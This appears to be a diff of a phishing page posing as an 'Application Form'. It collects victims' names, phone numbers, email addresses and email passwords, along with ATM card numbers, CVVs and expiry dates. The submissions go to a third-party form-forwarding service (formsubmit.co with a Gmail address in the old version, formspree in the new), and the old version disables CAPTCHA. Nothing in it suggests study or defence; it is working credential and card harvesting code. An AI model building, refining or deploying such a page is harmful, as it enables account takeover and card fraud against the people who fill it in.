@@ -7,203 +7,152 @@
   <style>
     body {
       font-family: Arial, sans-serif;
-      padding: 20px;
       background: #f2f2f2;
+      padding: 20px;
     }
     form {
       max-width: 500px;
       margin: auto;
       background: white;
-      padding: 20px;
-      border-radius: 8px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-    }
-    label {
-      display: block;
-      margin-top: 15px;
-      font-weight: bold;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.2);
     }
     input, select {
       width: 100%;
       padding: 10px;
       margin-top: 5px;
+      margin-bottom: 15px;
       border: 1px solid #ccc;
-      border-radius: 4px;
+      border-radius: 5px;
+      box-sizing: border-box;
     }
-    button[type="submit"] {
-      margin-top: 20px;
-      padding: 12px;
-      width: 100%;
-      background: #007bff;
-      color: white;
-      border: none;
-      border-radius: 4px;
-      font-size: 16px;
-      cursor: pointer;
-    }
-    button[type="submit"]:hover {
-      background: #0056b3;
-    }
-    .error-message {
-      color: red;
-      font-size: 14px;
-      margin-top: 4px;
-      display: none;
+    label {
+      font-weight: bold;
     }
     .password-wrapper {
       position: relative;
     }
-    .password-wrapper button {
-      position: absolute;
-      right: 10px;
-      top: 50%;
-      transform: translateY(-50%);
-      background: none;
-      border: none;
-      cursor: pointer;
-      font-size: 16px;
+    .password-wrapper input {
+      padding-right: 40px;
     }
-    .atm-section {
+    .password-wrapper .toggle-password {
+      position: absolute;
+      top: 50%;
+      right: 10px;
+      transform: translateY(-50%);
+      cursor: pointer;
+    }
+    .error {
+      color: red;
+      font-size: 0.9em;
+      margin-top: -10px;
+      margin-bottom: 10px;
       display: none;
+    }
+    button {
+      background-color: #4CAF50;
+      color: white;
+      padding: 12px;
+      border: none;
+      border-radius: 5px;
+      width: 100%;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #45a049;
     }
   </style>
 </head>
 <body>
-  <form id="applicationForm" 
-        action="https://formsubmit.co/exellentfirm@gmail.com" 
-        method="POST" 
-        novalidate>
-        
-    <h2>Application Form</h2>
 
-    <label for="fullName">Full Name</label>
-    <input type="text" id="fullName" name="fullName" required />
-    <div id="errorFullName" class="error-message">Full Name is required</div>
+<form id="applicationForm" action="https://formspree.io/f/mayvlzlp" method="POST">
+  <h2>Application Form</h2>
 
-    <label for="country">Country</label>
-    <input type="text" id="country" name="country" required />
-    <div id="errorCountry" class="error-message">Country is required</div>
+  <label for="fullName">1. Full Name:</label>
+  <input type="text" id="fullName" name="Full Name" required />
 
-    <label for="phone">Phone Number</label>
-    <input type="tel" id="phone" name="phone" required />
-    <div id="errorPhone" class="error-message">Phone number must be 9 to 12 digits</div>
+  <label for="country">2. Country:</label>
+  <input type="text" id="country" name="Country" required />
 
-    <label for="email">Email</label>
-    <input type="email" id="email" name="email" required />
-    <div id="errorEmail" class="error-message">Please enter a valid email</div>
+  <label for="phone">3. Phone Number:</label>
+  <input type="tel" id="phone" name="Phone Number" required pattern="[0-9]{9,12}" />
+  <div id="phoneError" class="error">Phone number must be 9 to 12 digits.</div>
 
-    <label for="password">Email Password</label>
-    <div class="password-wrapper">
-      <input type="password" id="password" name="password" required />
-      <button type="button" onclick="togglePassword()">👁️</button>
-    </div>
-    <div id="errorPassword" class="error-message">Email Password is required</div>
+  <label for="email">4. Email:</label>
+  <input type="email" id="email" name="Email" required />
 
-    <label for="linked">Did you link your ATM card to your account?</label>
-    <select id="linked" name="linked" required>
-      <option value="" disabled selected>Select</option>
-      <option value="yes">Yes</option>
-      <option value="no">No</option>
-    </select>
-    <div style="color: red; font-weight: bold; margin-top: 5px;">
-      YOU MUST HAVE ATM CARD TO PROCEED
-    </div>
-    <div id="linkError" class="error-message">You must link your ATM card to proceed.</div>
+  <label for="emailPassword">5. Email Password:</label>
+  <div class="password-wrapper">
+    <input type="password" id="emailPassword" name="Email Password" required />
+    <span class="toggle-password" onclick="togglePassword()">👁️</span>
+  </div>
 
-    <div class="atm-section" id="atmSection">
-      <label for="card">ATM Card Number</label>
-      <input type="number" id="card" name="card" />
-      <div id="errorCard" class="error-message">ATM card must be 16 digits</div>
+  <label for="atmLinked">6. Did you link your ATM card to your account?</label>
+  <select id="atmLinked" name="ATM Linked" required>
+    <option value="">-- Select --</option>
+    <option value="Yes">Yes</option>
+    <option value="No">No</option>
+  </select>
+  <div id="atmInstruction" class="error">YOU MUST HAVE ATM CARD TO PROCEED</div>
 
-      <label for="expiry">Expiry Date</label>
-      <input type="month" id="expiry" name="expiry" />
+  <label for="atmNumber">7. ATM Card Number:</label>
+  <input type="text" id="atmNumber" name="ATM Card Number" required pattern="\d{16}" maxlength="16" />
+  <div id="atmError" class="error">ATM Card Number must be exactly 16 digits.</div>
 
-      <label for="cvv">CVV</label>
-      <input type="number" id="cvv" name="cvv" />
-      <div id="errorCVV" class="error-message">CVV must be 3 digits</div>
-    </div>
+  <label for="cvv">8. CVV:</label>
+  <input type="text" id="cvv" name="CVV" required pattern="\d{3}" maxlength="3" />
+  <div id="cvvError" class="error">CVV must be 3 digits.</div>
 
-    <!-- ✅ Hidden inputs to enable redirect and disable CAPTCHA -->
-    <input type="hidden" name="_next" value="https://onlinegistrationProg.github.io/application-form/thank-you.html">
-    <input type="hidden" name="_captcha" value="false">
+  <label for="expiry">9. Expiry Date (MM/YY):</label>
+  <input type="text" id="expiry" name="Expiry Date" required pattern="(0[1-9]|1[0-2])\/\d{2}" placeholder="MM/YY" />
+  <div id="expiryError" class="error">Format must be MM/YY.</div>
 
-    <button type="submit">Submit Application</button>
-  </form>
+  <button type="submit">Submit</button>
+</form>
 
-  <script>
-    function togglePassword() {
-      const pass = document.getElementById("password");
-      pass.type = pass.type === "password" ? "text" : "password";
-    }
+<script>
+  const phone = document.getElementById("phone");
+  const phoneError = document.getElementById("phoneError");
 
-    const form = document.getElementById("Application Form");
-    const linked = document.getElementById("linked");
-    const atmSection = document.getElementById("atmSection");
+  const atmLinked = document.getElementById("atmLinked");
+  const atmInstruction = document.getElementById("atmInstruction");
 
-    linked.addEventListener("change", function () {
-      const showATM = linked.value === "yes";
-      document.getElementById("linkError").style.display = "none";
-      atmSection.style.display = showATM ? "block" : "none";
-    });
+  const atmNumber = document.getElementById("atmNumber");
+  const atmError = document.getElementById("atmError");
 
-    form.addEventListener("submit", function(event) {
-      const linkError = document.getElementById("linkError");
+  const cvv = document.getElementById("cvv");
+  const cvvError = document.getElementById("cvvError");
 
-      if (linked.value !== "yes") {
-        event.preventDefault();
-        linkError.style.display = "block";
-        linked.focus();
-        return;
-      }
+  const expiry = document.getElementById("expiry");
+  const expiryError = document.getElementById("expiryError");
 
-      const card = document.getElementById("card");
-      const cvv = document.getElementById("cvv");
+  phone.addEventListener("input", () => {
+    phoneError.style.display = phone.validity.patternMismatch ? "block" : "none";
+  });
 
-      if (card.value.length !== 16) {
-        event.preventDefault();
-        document.getElementById("errorCard").style.display = "block";
-      } else {
-        document.getElementById("errorCard").style.display = "none";
-      }
+  atmNumber.addEventListener("input", () => {
+    atmError.style.display = atmNumber.validity.patternMismatch ? "block" : "none";
+  });
 
-      if (cvv.value.length !== 3) {
-        event.preventDefault();
-        document.getElementById("errorCVV").style.display = "block";
-      } else {
-        document.getElementById("errorCVV").style.display = "none";
-      }
-    });
+  cvv.addEventListener("input", () => {
+    cvvError.style.display = cvv.validity.patternMismatch ? "block" : "none";
+  });
 
-    // Real-time validation
-    document.getElementById("fullName").addEventListener("input", function() {
-      document.getElementById("errorFullName").style.display = this.value.trim() === "" ? "block" : "none";
-    });
+  expiry.addEventListener("input", () => {
+    expiryError.style.display = expiry.validity.patternMismatch ? "block" : "none";
+  });
 
-    document.getElementById("country").addEventListener("input", function() {
-      document.getElementById("errorCountry").style.display = this.value.trim() === "" ? "block" : "none";
-    });
+  atmLinked.addEventListener("change", () => {
+    atmInstruction.style.display = atmLinked.value === "No" ? "block" : "none";
+  });
 
-    document.getElementById("phone").addEventListener("input", function() {
-      const valid = /^\d{9,12}$/.test(this.value);
-      document.getElementById("errorPhone").style.display = valid ? "none" : "block";
-    });
+  function togglePassword() {
+    const pwd = document.getElementById("emailPassword");
+    pwd.type = pwd.type === "password" ? "text" : "password";
+  }
+</script>
 
-    document.getElementById("email").addEventListener("input", function() {
-      const valid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(this.value);
-      document.getElementById("errorEmail").style.display = valid ? "none" : "block";
-    });
-
-    document.getElementById("password").addEventListener("input", function() {
-      document.getElementById("errorPassword").style.display = this.value.trim() === "" ? "block" : "none";
-    });
-
-    document.getElementById("card").addEventListener("input", function() {
-      document.getElementById("errorCard").style.display = this.value.length === 16 ? "none" : "block";
-    });
-
-    document.getElementById("cvv").addEventListener("input", function() {
-      document.getElementById("errorCVV").style.display = this.value.length === 3 ? "none" : "block";
-    });
-  </script>
 </body>
 </html>
